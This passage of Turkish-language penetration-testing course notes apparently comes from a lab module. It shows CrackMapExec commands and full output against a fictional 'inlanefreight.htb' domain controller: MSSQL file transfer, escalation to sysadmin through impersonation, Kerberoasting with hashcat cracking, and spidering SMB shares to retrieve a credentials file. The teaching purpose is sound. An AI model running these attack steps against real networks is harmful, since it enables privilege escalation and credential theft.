Not: MSSQL aracılığıyla Windows komutlarını çalıştırabilmek, Windows makinesinde `local administrator` olduğumuz anlamına gelmez. Ayrıcalıklarımızı yükseltebilir veya hedef makine hakkında daha fazla bilgi almak için bu erişimi kullanabiliriz.


### MSSQL ile Dosya Aktarma

MSSQL, sırasıyla [OPENROWSET (Transact-SQL)](https://learn.microsoft.com/en-us/sql/t-sql/functions/openrowset-transact-sql) ve [Ole Automation Procedures Sunucu Yapılandırma Seçeneklerini](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option) kullanarak dosyaları indirmemize ve yüklememize izin verir. CrackMapExec bu seçenekleri -`-put-file` ve -`-get-file` ile birleştirir.

Hedef makinemize bir dosya yüklemek için `--put-file` seçeneğini ve ardından yüklemek istediğimiz local dosyayı ve hedef dizini kullanabiliriz


### Upload File (Dosya Yükle)

```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --localauth --put-file /etc/passwd C:/Users/Public/passwd

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:DC01)
MSSQL 10.129.203.121 1433 DC01 [+]
nicole:Inlanefreight02! (Pwn3d!)
MSSQL 10.129.203.121 1433 DC01 [*] Copy /etc/passwd
to C:/Users/Public/passwd
MSSQL 10.129.203.121 1433 DC01 [*] Size is 3456 bytes
MSSQL 10.129.203.121 1433 DC01 [+] File has been
uploaded on the remote machine
```

```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --localauth -x "dir c:\Users\Public"

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:DC01)
MSSQL 10.129.203.121 1433 DC01 [+]
nicole:Inlanefreight02! (Pwn3d!)
MSSQL 10.129.203.121 1433 DC01 [+] Executed command
via mssqlexec
MSSQL 10.129.203.121 1433 DC01
----------------------------------------------------------
MSSQL 10.129.203.121 1433 DC01 Volume in drive C has
no label.
MSSQL 10.129.203.121 1433 DC01 Volume Serial Number
is B8B3-0D72
MSSQL 10.129.203.121 1433 DC01 Directory of
c:\Users\Public
MSSQL 10.129.203.121 1433 DC01 12/01/2022 04:22 AM
<DIR> .
MSSQL 10.129.203.121 1433 DC01 12/01/2022 04:22 AM
<DIR> ..
MSSQL 10.129.203.121 1433 DC01 10/06/2021 02:38 PM
<DIR> Documents
MSSQL 10.129.203.121 1433 DC01 09/15/2018 01:19 AM
<DIR> Downloads
MSSQL 10.129.203.121 1433 DC01 09/15/2018 01:19 AM
<DIR> Music
MSSQL 10.129.203.121 1433 DC01 12/01/2022 04:22 AM
3,456 passwd
MSSQL 10.129.203.121 1433 DC01 09/15/2018 01:19 AM
<DIR> Pictures
MSSQL 10.129.203.121 1433 DC01 09/15/2018 01:19 AM
<DIR> Videos
MSSQL 10.129.203.121 1433 DC01 1 File(s)
3,456 bytes
MSSQL 10.129.203.121 1433 DC01 7 Dir(s)
10,588,659,712 bytes free

```


Bir dosyayı indirmek için, `--get-file` seçeneğini kullanmamız ve ardından dosyanın yolunu ve bir çıktı dosyası adı belirlememiz gerekir.


### MSSQL aracılığıyla Hedef Makineden Dosya İndirme

```
crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --localauth --get-file C:/Windows/System32/drivers/etc/hosts hosts

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:DC01)
MSSQL 10.129.203.121 1433 DC01 [+]
nicole:Inlanefreight02! (Pwn3d!)
MSSQL 10.129.203.121 1433 DC01 [*] Copy
C:/Windows/System32/drivers/etc/hosts to hosts
MSSQL 10.129.203.121 1433 DC01 [+] File
C:/Windows/System32/drivers/etc/hosts was transferred to hosts


cat hosts
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
<SNIP>

```


### SQL Privilege Escalation **Module**

CrackMapExec, MSSQL için birkaç modül içerir, bunlardan biri **`mssql_priv`**'dir. Bu modül, MSSQL ayrıcalıklarını sıralar ve kullanarak bir standart kullanıcıdan sysadmin yetkilerine yükselmeye çalışır. Bunu başarmak için, bu modül MSSQL'deki iki (2) ayrıcalık yükseltme vektörünü sıralar: **`EXECUTE AS LOGIN`** ve **`db_owner rolü`**. Modülün üç seçeneği vardır: **`enum_privs`** (ayrıcalıkları listelemek için, varsayılan), **`privesc`** (ayrıcalıkları yükseltmek için) ve **`rollback`** (kullanıcıyı orijinal durumuna geri döndürmek için). Şimdi bunu nasıl çalıştığını görelim. Aşağıdaki örnekte, kullanıcı **`INLANEFREIGHT\robert`**, sysadmin yetkilerine sahip olan **`julio`**'yu taklit etme ayrıcalığına sahiptir.


### MSSQL Privilege Escalation

```
crackmapexec mssql -M mssql_priv --options
[*] mssql_priv module options:
 ACTION Specifies the action to perform:
 - enum_priv (default)
 - privesc
 - rollback (remove sysadmin privilege)
```

```
crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL 10.129.203.121 1433 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01!
MSSQL_PR... 10.129.203.121 1433 DC01 [+]
INLANEFREIGHT\robert can impersonate julio (sysadmin)
```

```
crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=privesc
MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL 10.129.203.121 1433 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01!
MSSQL_PR... 10.129.203.121 1433 DC01 [+]
INLANEFREIGHT\robert can impersonate julio (sysadmin)
MSSQL_PR... 10.129.203.121 1433 DC01 [+]
INLANEFREIGHT\robert is now a sysadmin! (Pwn3d!)

```

Bir sysadmin kullanıcısı olarak artık komutları çalıştırabiliriz. Bunu yapalım ve ardından ayrıcalıklarımızı orijinal durumlarına geri döndürelim


### Komutları Yürütme ve Ayrıcalıkları Geri Alma

```
crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -x whoami

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL 10.129.203.121 1433 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
MSSQL 10.129.203.121 1433 DC01 [+] Executed command
via mssqlexec
MSSQL 10.129.203.121 1433 DC01 ----------------------
----------------------------------------------------------
MSSQL 10.129.203.121 1433 DC01
inlanefreight\svc_mssql
```

```
crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=rollback
MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL 10.129.203.121 1433 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
MSSQL_PR... 10.129.203.121 1433 DC01 [+] sysadmin role
removed
```

```
crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -x whoami

MSSQL 10.129.203.121 1433 DC01 [*] Windows 10.0 Build
17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL 10.129.203.121 1433 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01!
```


Not: Modülü sahip olduğumuz kullanıcılarla test etmek için, `--no-bruteforce` ve            `--continue-on-success` ile çoklu kullanıcı işlevselliği bir modülü aynı anda birden fazla hesapla test etmeyi desteklemediğinden, bunları tek tek denemek gerekir.


### Finding Kerberoastable Accounts

Kerberoasting saldırısı, tipik olarak bir servis hesabı olan `servicePrincipalName (SPN)` değerlerine sahip bir kullanıcıdan TGS (Ticket Granting Service) Biletleri toplamayı amaçlar. Herhangi bir geçerli Active Directory hesabı, herhangi bir SPN hesabı için bir TGS talep edebilir. Ticket'ın bir kısmı hesabın `NTLM parola hash'i` ile şifrelenir, bu da parolayı çevrimdışı olarak kırmayı denememize olanak tanır. 

Kerberoastable hesaplarını bulmak için, domain'de geçerli bir kullanıcıya sahip olmamız, `--kerberoasting` seçeneği ve ardından bir dosya adı ile LDAP protokolünü kullanmamız ve DC'nin IP adresini CrackMapExec'te hedef olarak belirtmemiz gerekir:


### Kerberoasting Attack

```
crackmapexec ldap dc01.inlanefreight.htb -u grace -p 'Inlanefreight01!' --kerberoasting kerberoasting.out

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
LDAP dc01.inlanefreight.htb 389 DC01 [*] Total of
records returned 4
CRITICAL:impacket:CCache file is not found. Skipping...
LDAP dc01.inlanefreight.htb 389 DC01 sAMAccountName:
grace memberOf: CN=SQL Admins,CN=Users,DC=inlanefreight,DC=htb pwdLastSet:
2022-10-25 15:48:04.646233 lastLogon:2022-12-01 07:20:01.171413
LDAP dc01.inlanefreight.htb 389 DC01
$krb5tgs$23$*grace$INLANEFREIGHT.HTB$inlanefreight.htb/grace*$ce19d59e7823
310c7fb51920d24bd56c$1cc46b764998c6077ee9a7f5a215a93bbae3b3a944584ac373823
a55c0d3e35600a91e0bd3c8b7e2366675dd10efb1c9fdde2d5dd46b1f6e346077daf4a3757
432921ae14c0801094c7fd2d0d50550c9a4924203e81272888ea1067f838cf306e6622102e
4ccc885158bd0515e7ec84fa5c6f660ce7045d41e16af7e8ece1878aef72e2605e4514b118
65bfbad3a4d788558395586ed4bbede9d0a2e106f4870bd2698f272b3ba30756fe84f44ab9
2ee92fbcd5b7cd66dd376f4ecb6f57f63ebfa2f8e0ff7794ce6a4bd9a49018b9bc64da5349
de833aff84d77ea5a1d6fdcb2b46986586e438535f3da26d077df2396d2b5d947a8bbfecbb
221c7babe2881558098adc70d68b9468257381eb0639a6a532486016167f3d246c10a43612
23b1c6f63fc9d34a749b2092a9b329761b7262259e22d8ff4a582d1f4b3c6627f5fa16684d
e5bdafb3fefca637f83eeede7d79542f470ad850c6e7f8141bdb6f2767f9ddbe81688f1e50
0fa59b09502eba8e733a3fd5548250299276b10365766c85a244ece2c9f0344f3b3b5953f1
31335596f5b91fcc365ba6ed4cab1ef2f72731d8b1e459fd69915df55c710d22e583712fd2
3999761411572089b0434782e05d364fb168eae1625b111e74351fd18ceb7186f14d25b533
d8c8b00dbbd5b0357e9e894fa65df8ef43bcd1547ab7a01f716a1c471b3e7df0f66c31e20e
e0e12d3d6f1deb859321a084fa819f7c8fc23cafa1cf6a19b4f65a7c7337e816b04bb1ef72
e45031493c9a0940519d53851beb2795d477f4c64a401eefc7a3541143df11ae983ba2ff3b
6d16580e23179bdece2fa9c4023dd71de199c94cbfbab166d0a64110e2522ff5f74c442ba0
439a72119835f0e01422d0f8cf758b9dc906074fab81957972732f60fc26d06af9170cf5f4
8531a5cf9cf63cd5cff0fad2f2e317588852c7df94954e2cb5b35e274de5976d33249e053c
f23d26f45f9c9fbd418b460b5a4cb0b11fabae91bdd2113798e5401891d514cf6525419eac
37b004487e83e6c50669d6560e07a753b86f4fb7535f3429a767e43f307dc3537eb3d808b4
fd517c0dcc6b8cf26cb1c978f67b349fa0e4699d1b2c7325f9d1d6cf31cfe6fbf8d837b0f5
d9b5265f9c3ccf9b79e9b88d6ab4a77297cd2866b732f1d4516541f556cd5c20dff46bfec4
56647159017bd34d02afe2f5baee661bfa48bcfccb08d8e835be6af48a17152811d9e03222
9c898df53082515a08c3962d4dca0dc262b758bc30fd18b36ecadc17d73141c03ae9deffcb
2c776305a1928e0addd709a2609192f8270be7ce38936a47f21f2b1eb5a6ed27e1c76719fc
83edffa5791064b8e77e643602fb6a459ae399ea48961e14125eba0fede24db448cfc42bb6
90bf0d7af80fedfb440e13e61a71996fcfe29c872add3d6189e085636c4eb2c480a171b121
5a43b438ff5ffccd6106e48e1b3
LDAP dc01.inlanefreight.htb 389 DC01 sAMAccountName:
peter memberOf: CN=Remote Management
Users,CN=Builtin,DC=inlanefreight,DC=htb pwdLastSet: 2022-10-26
06:55:58.364988 lastLogon:2022-10-26 14:45:08.305940
LDAP dc01.inlanefreight.htb 389 DC01
$krb5tgs$23$*peter$INLANEFREIGHT.HTB$inlanefreight.htb/peter*$eb2c68e3a589
9ec32a9786b8ec58fe7d$f1baabf78434c380a2d7bba8c8cfae70fe520c6d7a710ee5f8754
c1d7fcaa77b66cf26f02d3a97e8a98c3443d1791418f26c181433be3f42673ab3accfb2ed9
ec3c67acc5269fcd31b327cc676ff3a482a7741f640e2f2918c31949297327e2c771e340a1
ed8859e95029001313d5b948041e6ad6e8fff55cfeb09fbdf3445295b939a94601b6f28af7
304fd2708f4f68f7568c69fce576bffe8f5db57def476123f89ea380917e5bc54e5e993717
b4949f4de5a0c44f5e40a359bb5945feda402cca16bd0a8d85a374f16bd061e64e2bc49d35
2fa504490260e9808e49daafef1c08390bc3f21ec3f5167a649ebb2a91b7021c9b6df26b1c
3bc68b2e53b94e9a09861ef26cc5aa1bfcdd543fa77d4b9428a2c8ef90f6d54388ed55bbad
930cea6193160ff58330ca083b095edab8e11ba0ce1c53a51a341222144f1f0bbf82169592
d6537b676c54955addb6bdd9e4361fc177bff5d2bf581f24a682c0f32dd381e0d657b5caea
b6e6b6bcffdab8e509a3f3af414ced94c9198915a0c880bea6c0b6a1818c88b24ab5c87984
889363ef5993a190266def79c5d3ddcfecfdd3263dc83a303db8ab000a3021c1b50844e5ae
796aa79620ff79bfe2b0347d04de8f14a48f6b4e970fdaf03efce818c13d7e7da068d9bbdc
af361d77d5907a4b672e327f17833b2cdee523dae8a878e8d3c273bd0038c66475d00c337a
c19df2fe8cc6e9e4e49335e30dbb4eebd3f9d24e762524d7ab6e36ab532a1924dc8a6e6049
99e8ed3736ea1f29a3758d22f982600a0523b56780364e892014879f56fe79ce21442a4509
cd548cdf180529ea283509bf8925b7d5275284994caef811731ba63b1cabd92368299e9364
f3bf4d77bb7a0aec6487d0cfd776b9ee234f170a387c72ebc06aca19ed31b6d86a9986634a
2aa3f538c51aea0db3efd26a8e7ed438c60cbb2cc5dcbb6e564c1364775f84ed9b49d65ec0
40c6e75d4e5182a26cd86d17197212331edb0d135e7e77d3ee3277164af500e0c61d6f598b
a1950868bf0cfd318547830a3faeb98fd40adccabd72b02733c90f8563326d65be4c707d68
a26d4482525bbb1084b816e83772b4098a5d54a22b4c7abbc3b32fa0e9b57a5e660ae8378b
f54e8b405a5cff00b3038bcabc40a089732de4c93a44c84446f82f19f5f17310d8963cff4c
ee063767cb8680a5edeec3b59fcaaa1df2e05432478028a6e9346c09685febbf28ed9cbe36
c2fcd3246f973dbc8bec55afdd0c36e140b34bd1203e61370dcdf2899ea0b88cfa6e5c562e
08214441b4ebe7eeec4053349682bd0424cddb5c601ba681daad100ae639730a058b7b6af5
fc5edade0f24ccac56183d01508a9fda7d7d14ccce48c9e86d3b188cd5cd67b400582b267a
1f745a700fad067fe55f5ccca3a8655aeb28af683f9d6ccdc2eeb06d1adc2c4056bccef814
f172dcf06f756648e4c4498ef57
```


Herhangi bir Kerberoastable hesabı varsa, CrackMapExec bunları çevrimdışı olarak kırmayı denememiz gereken `hash` ile birlikte görüntüler. Bizim durumumuzda, şifreyi kırmak için `rockyou.txt` kelime listesini ve Hashcat uygulamasını kullanacağız. 


### Cracking the Hash

```
hashcat -m 13100 kerberoasting.out /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...
<SNIP>
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921355
* Keyspace..: 14344386
$krb5tgs$23$*peter$INLANEFREIGHT.HTB$inlanefreight.htb/peter*$026257d4f9aa
58cd5c654295eac8255f$22ea3062f1822e967934263b37ff1b565342b3934c2864b46366d
e7bf3e230d0cb08f605deae3053c6f93944256c409c9f352ac337c33f5c4ad8adf125cd686
3598d3a8c97ec60fb19c5e3691e825f95333509fbff9e2832d465ce2beee4f290bac2c52a2
ce625b613778a5ebebb668a2538cb547c0d0d5c45e455f5df03e08a054349fcd24e140dcb2
315f1af23e11ebe547556a24a200585353de9e6654ec71f205a3e37fa129bede32f0ca385d
fe7ff84cea07c8bc646147782cadb47e03b1a230c8f828a40a34d78d57513892fb1fee09a7
888be76738374fbd3baa2050572db461221c256abafafc92e6bfc84f8c5b0771c5bb1846f0
7b971089570b12bc8eb970a8da3f5d81f16a4353e86e8cf8ff77f834b6d9384d3e81058583
aef8d145427bbc772f9f56153b8bc075d73841e3592ae4da6533cefb28b20186d2df253787
10411b517b6bca5f9c1ddfed3e357a12f8ab677b963ca4aa16de76adb49068ee7d956e95ac
04c624fef3f288640ccd260c12dddfa2771b5582e1351af1d99aa2f185687cc1613b294430
8563afbc6d4caf9da56e61ccbf46359a3b50b1defdb8b54c4ddbcee0ce3a18b6b532ba7227
c0918795531726e773754ee35cf3ce5b5dcf89ed8b13dd2774e6c1342e77f3fcae92065761
95b4a48f845f193e8b949b499c14f0bf8086c73da821c183b8e9155e15e5295b7a05b49643
3a946fecd51730150f6655e761b56b3ce0ad27884888ef88b7fd1e2fc7dd7f113cc84c684a
976f43bdde4d3e6f8a20114da482c640dd83439b781bf6c00a73419720d1201bd5f3a9e883
27b87cb6cf37ee88b7d5e04d51a09994b350bcbb1e3d6345293773874e3771558fea92dae0
aa010e88372cd5520a06538c0a6c93584f6490601cc5cc1c6644974ad6e4103f027a7d3292
4c680679478f3228c54f171920cd48272d4fcbd014acaea185f5e219a00476d8a78abcd8c3
bdbad14f5850476c3eeb62f0817ffc5ff3467a01408c75a743a71045edfd329644683c0800
5c7abc83e8527209b9b621488e39e9b2e5baca8247020b7e53dc1f9efa40d7d70886affa05
90922641c31ace175df3a0ab7a8f989fa6bd7442b07b67a3d72faabec69f61a6d455d18544
979f844ca6b64d9c3487be207e8ee80b605a2abe09221382e6574fda9e39adf03ab3687152
af2fbb210728777b481dd7290731a0abecdfb63d72d9f9da6ac13e7b0363ab194a5e714df5
dbac2eabacfdd6666c736ee7d074720d0860c5ed8b5c937cd12188a18b2bef1511642b5b13
a4c5179e23e7867a9d5536e309100c8bc9a2a71b370a733fd9e972683138d08bbb5c923257
888efc51cef997b062fca914954d91cfab3e9aafccf051c208d4149b6abc26fd1c1cc2e630
a2f4fc0dae40e1b1ad2cd477b9feabdc9e696d43080438d9f1207b96ce7fc3a49739f4bc50
dee57553a661778ea14cf431a0e:Password123
<SNIP>

```

Hesabın parolasını aldıktan sonra, hesabın hala etkin olup olmadığını doğrulamamız gerekir. Bunu SMB protokolünü kullanarak yapabiliriz, çünkü normal bir domain kullanıcısı veya yönetici hesabı olarak kimlik doğrulaması yapmaya çalışacaktır.


### Testing the Account Credentials

```
crackmapexec smb 10.129.203.121 -u peter -p Password123

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\peter:Password123

```

Bir sonraki bölümde, paylaşılan klasörlerde ilginç bilgiler aramak için bulduğumuz tüm aktif hesapları nasıl kullanabileceğimizi tartışacağız.

---

### Bir SMB Paylaşımında Spidering ve Önemli Bilgileri Bulma

Şirketlerin, insanlar ve departmanlar arasında işbirliğini sağlamak için bilgileri merkezi bir konumda depolaması gerekir. Genellikle bir departman, başka bir departmanın işlemesi gereken bilgileri işler. Şirketlerin bu tür bir işbirliğine izin vermesinin en yaygın yollarından biri paylaşılan klasörlerdir.

Erişim sağladığımız hesapları kullanarak paylaşım klasörlerine erişim talep etmek ve erişimleri olup olmadığını tespit etmek için `--shares` seçeneğini kullanabiliriz.


### Hesapların Paylaşılan Klasörlere Erişimi Olup Olmadığını Belirleme

```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --shares

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [+] Enumerated shares
SMB 10.129.203.121 445 DC01 Share
Permissions Remark
SMB 10.129.203.121 445 DC01 ----- ------
----- ------
SMB 10.129.203.121 445 DC01 ADMIN$
Remote Admin
SMB 10.129.203.121 445 DC01 C$
Default share
SMB 10.129.203.121 445 DC01 carlos
SMB 10.129.203.121 445 DC01 CertEnroll READ
Active Directory Certificate Services share
SMB 10.129.203.121 445 DC01 D$
Default share
SMB 10.129.203.121 445 DC01 david
SMB 10.129.203.121 445 DC01 IPC$ READ
Remote IPC
SMB 10.129.203.121 445 DC01 IT
READ,WRITE
SMB 10.129.203.121 445 DC01 john
SMB 10.129.203.121 445 DC01 julio
READ,WRITE
SMB 10.129.203.121 445 DC01 linux01
READ,WRITE
SMB 10.129.203.121 445 DC01 NETLOGON READ
Logon server share
SMB 10.129.203.121 445 DC01 svc_workstations
SMB 10.129.203.121 445 DC01 SYSVOL READ
Logon server share
SMB 10.129.203.121 445 DC01 Users
```

Not: Bu modül yazılırken, CrackMapExec `--shares` seçeneği ile birden fazla kullanıcı adı ve parola sorgulamayı desteklemiyordu

`--shares` seçeneği, hedef makinedeki her bir paylaşımı ve kullanıcımızın bu paylaşımlar üzerinde hangi izinlere (READ/WRITE) sahip olduğunu gösterir. IT adlı ilginç bir klasöre okuma ve yazma erişimimiz var. [Impacket smbclient](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py) kullanarak kolayca açabilir veya paylaşımı bağlayabiliriz. Yüzlerce paylaşımın içeriğini kontrol ederken elverişsiz hale gelebilir. Bu amaçla, CrackMapExec, `spider` seçeneği ve `spider_plus` modülü olmak üzere iki harika özellikle birlikte gelir.

Not: Domain'deki herhangi bir bilgisayarın bir paylaşımlı klasöre sahip olabileceğini unutmayın. Paylaşılan klasörleri bulmak için hedeflediğimiz ağda önceden tanımlanmış makineleri hedeflemeliyiz.


### The Spider Option

CrackMapExec'teki `--spider` seçeneği, remote bir paylaşım içinde arama yapmanıza ve aradığınız şeye bağlı olarak ilginç dosyalar bulmanıza olanak tanır. Örneğin, `--pattern` seçeneğini ve ardından aramak istediğimiz kelimeyi ekliyoruz, bu durumda `txt` ve içinde `txt` olan tüm dosyaları listeleyebiliriz (`test.txt,` a`txtb.csv`)

### “txt” İçeren Dosyaları Aramak için spider Seçeneğini Kullanma

```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --spider IT  --pattern txt

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [*] Started spidering
SMB 10.129.203.121 445 DC01 [*] Spidering .
SMB 10.129.203.121 445 DC01
//10.129.203.121/IT/Creds.txt [lastm:'2022-10-31 11:16' size:54]
SMB 10.129.203.121 445 DC01
//10.129.203.121/IT/IPlist.txt [lastm:'2022-10-31 11:15' size:36]
<SNIP>
SMB 10.129.203.121 445 DC01 [*] Done spidering
(Completed in 1.7534186840057373)


```


Klasörler, dosya adları veya dosya içeriği üzerinde daha ayrıntılı aramalar yapmak için      `--regex [REGEX]` seçeneğiyle regex ifadeleri de kullanabiliriz. Aşağıdaki örnekte, paylaşılan IT klasöründeki herhangi bir dosya ve dizini görüntülemek için `--regex` . kullanalım:


### IT Paylaşımındaki Tüm Dosya ve Dizinleri Listele seçeneğini de kullanabiliriz


```
crackmapexec smb 10.129.204.177 -u grace -p Inlanefreight01! --spider IT -
-regex .

SMB 10.129.204.177 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.204.177 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.204.177 445 DC01 [*] Started spidering
SMB 10.129.204.177 445 DC01 [*] Spidering .
SMB 10.129.204.177 445 DC01 //10.129.204.177/IT/.
[dir]
SMB 10.129.204.177 445 DC01 //10.129.204.177/IT/..
[dir]
SMB 10.129.204.177 445 DC01
//10.129.204.177/IT/Creds.txt [lastm:'2022-12-01 09:01' size:54]
SMB 10.129.204.177 445 DC01
//10.129.204.177/IT/Documents [dir]
SMB 10.129.204.177 445 DC01
//10.129.204.177/IT/IPlist.txt [lastm:'2022-12-01 09:01' size:36]
SMB 10.129.204.177 445 DC01
//10.129.204.177/IT/passwd [lastm:'2022-12-19 11:28' size:3456]
SMB 10.129.204.177 445 DC01 
//10.129.204.177/IT/Documents/. [dir]
...SNIP...
SMB 10.129.204.177 445 DC01 [*] Done spidering
(Completed in 1.593825340270996)
```


Dosya içeriğinde arama yapmak istiyorsak `--content` seçeneği ile bunu etkinleştirmemiz gerekir. “`Encrypt`” kelimesini içeren bir dosya arayalım.


### Dosya İçeriğini Arama

```
crackmapexec smb 10.129.204.177 -u grace -p Inlanefreight01! --spider IT  --content --regex Encrypt

SMB 10.129.204.177 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.204.177 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.204.177 445 DC01 [*] Started spidering
SMB 10.129.204.177 445 DC01 [*] Spidering .
SMB 10.129.204.177 445 DC01
//10.129.204.177/IT/Creds.txt [lastm:'2022-12-01 09:01' size:54 offset:54
regex:'b'Encrypt'']
SMB 10.129.204.177 445 DC01 [*] Done spidering
(Completed in 3.5477945804595947)
```

Çok ilginç bilgiler içeren `Creds.txt` adlı ilginç bir dosya görebiliriz. CrackMapExec kullanarak remote bir dosyayı alabiliriz. Paylaşımı `--share SHARENAME` seçeneğini kullanarak belirtmemiz, ardından `--get-file` kullanmamız ve ardından dosyanın paylaşım içindeki yolunu kullanmamız ve bir çıktı dosyası adı belirlememiz gerekir.


### Paylaşılan Klasördeki Bir Dosyayı Alma

```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --share IT --
get-file Creds.txt Creds.txt

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [*] Copy Creds.txt to
Creds.txt
SMB 10.129.203.121 445 DC01 [+] File Creds.txt was
transferred to Creds.txt
```


```
cat Creds.txt
Creds Encrypted:
ZWxpZXNlcjpTdXBlckNvbXBsZXgwMTIxIzIK
```



Tersi durumda, remote bir paylaşıma bir dosya göndermek istediğimizi düşünün. `WRITE` ayrıcalıklarına sahip olduğumuz bir paylaşım bulmamız gerekir. Daha sonra `--get-file` ile yaptığımız gibi `--put-file` seçeneğini kullanabiliriz.

### Paylaşılan Klasöre Dosya Gönderme

```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --share IT   --put-file /etc/passwd passwd

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [*] Copy /etc/passwd
to passwd
SMB 10.129.203.121 445 DC01 [+] Created file
/etc/passwd on \\IT\passwd
```

Not: Büyük bir dosya aktarıyorsak ve başarısız olursa, tekrar denediğinizden emin olun. Hata almaya devam ederseniz, `--smb-timeout` seçeneğini varsayılan iki (2) değerinden daha büyük bir değerle eklemeyi deneyin.


### The spider_plus Module

Bazen bir paylaşımla karşılaşabiliriz ve onu bağlamadan veya **`smbclient.py`** kullanmadan uzantıyla ilgili tüm dosyaları hızlıca listelemek isteyebiliriz. CrackMapExec, bunu halledecek **`spider_plus`** adında bir modül ile gelir. Bu modül, varsayılan olarak **`/tmp/cme_spider_plus`** adlı bir klasör ve paylaşımla ilgili dosya bilgilerini içeren **`IP.json`** adlı bir JSON dosyası oluşturur. **`EXCLUDE_DIR`** modül seçeneğini kullanarak, araçtın **`IPC$`**, **`NETLOGON`**, **`SYSVOL`** gibi paylaşımları göz ardı etmesini sağlayabiliriz.


### Using the Module spider_plus

```
crackmapexec smb 10.129.203.121 -u grace -p 'Inlanefreight01!' -M
spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SPIDER_P... 10.129.203.121 445 DC01 [*] Started spidering
plus with option:
SPIDER_P... 10.129.203.121 445 DC01 [*] DIR:
['ipc

Dizine gidebilir ve kullanıcının erişebileceği tüm dosyaların bir listesini alabiliriz:


### Kullanıcının Kullanabileceği Dosyaları Listeleme

```
{
  "IT": {
    "Creds.txt": {
      "atime_epoch": "2022-10-31 11:16:17",
      "ctime_epoch": "2022-10-31 11:15:17",
      "mtime_epoch": "2022-10-31 11:16:17",
      "size": "54 Bytes"
    },
    "IPlist.txt": {
      "atime_epoch": "2022-10-31 11:15:11",
      "ctime_epoch": "2022-10-31 11:14:52",
      "mtime_epoch": "2022-10-31 11:15:11",
      "size": "36 Bytes"
    }
  },
  "linux01": {
    "flag.txt": {
      "atime_epoch": "2022-10-05 10:17:02",
      "ctime_epoch": "2022-10-05 10:17:02",
